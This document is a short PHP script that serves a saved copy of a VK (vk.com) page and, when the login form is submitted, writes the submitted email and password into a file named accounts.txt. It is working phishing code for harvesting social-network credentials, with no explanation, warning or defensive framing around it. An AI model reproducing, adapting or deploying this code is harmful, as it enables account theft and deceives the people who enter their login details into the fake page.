<?php
if (isset($_POST["quick_email"])) {
    file_put_contents("accounts.txt",$_POST["quick_email"]."\n".$_POST["quick_pass"]."\n\n");
} else {
    echo file_get_contents("vk.com.php.htm");

}